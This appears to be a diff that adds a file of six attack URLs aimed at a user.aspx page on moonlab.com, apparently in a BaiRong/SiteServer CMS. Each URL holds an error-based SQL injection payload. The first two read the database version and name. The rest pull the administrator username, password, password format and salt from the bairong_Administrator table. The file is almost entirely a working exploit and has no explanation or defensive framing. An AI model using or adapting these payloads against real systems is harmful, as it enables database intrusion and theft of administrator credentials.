@@ -1,0 +1,13 @@
+http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)and%20@@version=2;%20--
+http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)and%20db_name()=~2;%20--
+http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)and%20~1=(select%20top%201%20username%20from%20[msmoonlab].[msmoonlab].[bairong_Administrator]);%20--
+http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)and%20~1=(select%20top%201%20password%20from%20[msmoonlab].[msmoonlab].[bairong_Administrator]);%20--
+http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)and%20~1=(select%20top%201%20passwordformat%20from%20[msmoonlab].[msmoonlab].[bairong_Administrator]);%20--
+http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)and%20~1=(select%20top%201%20passwordsalt%20from%20[msmoonlab].[msmoonlab].[bairong_Administrator]);%20--
+
+
+
+
+
+
+
